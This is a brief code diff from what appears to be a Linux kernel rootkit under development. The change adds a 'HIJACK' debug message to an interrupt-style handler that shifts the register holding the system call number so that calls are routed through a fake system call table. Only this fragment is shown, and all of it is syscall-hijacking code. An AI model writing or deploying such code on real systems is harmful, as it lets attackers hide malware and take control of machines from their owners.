@@ -19,6 +19,7 @@ int is_root = 0;
  */
 void handler(struct pt_regs *regs)
 {
+  debug_print("HIJACK: executing the handler");
   unsigned long off = ((unsigned long)fake_sct - (unsigned long)sct);
   regs->ax += off / sizeof(unsigned long);
 }
